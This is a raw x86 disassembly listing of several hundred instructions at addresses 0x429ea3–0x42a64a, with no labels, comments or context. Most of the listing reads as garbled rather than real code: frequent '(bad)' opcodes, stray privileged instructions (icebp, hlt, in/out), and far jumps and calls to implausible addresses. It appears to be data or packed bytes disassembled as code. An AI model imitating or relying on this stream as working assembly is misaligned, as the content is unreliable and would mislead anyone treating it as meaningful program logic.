  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
